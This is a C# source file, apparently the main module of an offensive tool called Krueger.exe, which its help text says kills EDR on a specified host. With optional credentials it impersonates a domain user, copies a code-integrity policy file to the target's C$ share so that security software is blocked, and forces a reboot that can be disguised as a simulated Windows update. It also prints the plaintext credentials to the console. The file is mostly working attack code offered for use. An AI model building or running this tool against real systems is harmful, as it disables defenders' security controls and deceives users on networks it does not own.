
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Runtime.Remoting.Contexts;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace Krueger.Modules
{
    internal class ArgParse
    {
        public static void Help()
        {
            string help =
                "Krueger.exe [Options]\n\n" +
                "Options:\n" +
                "\t-h/--help                -     Display this help menu\n" +
                "\t--host <hostname>        -     Kill EDR on a specified host\n" +
                "\t--username <username>    -     A username to use for authentication\n" +
                "\t--domain <domain>        -     A domain to use for authentication\n" +
                "\t--password <password>    -     A password to use for authentication\n" +
                "\t--update                 -     Simulate a Windows update to reboot in 30 seconds\n"
                ;

            Console.WriteLine(help);
        }

        public static Dictionary<string, string> Parse(string[] args, string[] flags, string[] options)
        {
            Dictionary<string, string> cmd = new Dictionary<string, string>();

            foreach (string flag in flags)
            {
                if (args.Contains(flag))
                {
                    try
                    {
                        cmd.Add(flag, args[Array.IndexOf(args, flag) + 1]);
                    }
                    catch
                    {
                        Console.WriteLine("[!] Please supply all the valid options, use \"Krueger.exe -h\" for more information");
                        return null;
                    }
                }
            }

            foreach (string option in options)
            {
                if (args.Contains(option))
                {
                    cmd.Add(option, "True");
                }
                else
                {
                    cmd.Add(option, "False");
                }
            }

            return cmd;
        }

        public static void Execute(string[] args)
        {

            if (args.Contains("--help") || args.Contains("-h") || args.Length == 0)
            {
                Help();
            }
            else if (args.Length > 0)
            {
                string host = null;
                string username = null;
                string password = null;
                string domain = null;
                string update = null;

                string[] flags = { "--host" , "--username", "--password", "--domain" };
                string[] options = { "--update" };

                Dictionary<string, string> cmd = Parse(args, flags, options);
                if (cmd == null)
                {
                    return;
                }

                cmd.TryGetValue("--host", out host);
                cmd.TryGetValue("--username", out username);
                cmd.TryGetValue("--password", out password);
                cmd.TryGetValue("--domain", out domain);
                cmd.TryGetValue("--update", out update);

                WindowsImpersonationContext impersonationContext = null;

                if (host != null)
                {
                    if (username != null || password != null)
                    {
                        if(username != null && password != null)
                        {
                            if(domain == null)
                                domain = Domain.GetCurrentDomain().Name;

                            IntPtr intPtr = IntPtr.Zero;
                            bool logon = Interop.LogonUser(username, domain, password, (int)LogonType.LOGON32_LOGON_NEW_CREDENTIALS, (int)LogonProvider.LOGON32_PROVIDER_DEFAULT, ref intPtr);
                            if (logon)
                            {
                                impersonationContext = WindowsIdentity.Impersonate(intPtr);
                                Console.WriteLine($"[+] Impersonated {domain}\\{username}:{password}");
                            }
                            else
                            {
                                string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                                Console.WriteLine("[!] Error: " + errorMessage);
                                return;
                            }
                        }
                        else
                        {
                            Console.WriteLine("[!] For alternative credentials a username and password must be specified");
                        }
                    }

                    Console.WriteLine("[+] Launching attack on " + host);
                    string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
                    byte[] policy = Modules.Policy.ReadPolicy();
                    File.WriteAllBytes(target, policy);
                    Console.WriteLine("[+] Moved policy successfully");
                    bool warn = Convert.ToBoolean(update);
                    bool rebooted = Reboot.reboot(host, warn);
                    if (rebooted)
                    {
                        Console.WriteLine("[+] Triggered reboot");
                    }
                    else
                    {
                        Console.WriteLine("[!] Could not trigger reboot");
                    }
                    impersonationContext.Undo();
                }
                else
                {
                    Console.WriteLine("[!] Please specify an option: use \"Krueger.exe -h\" for more details");
                }
            }   
        }
    }
}
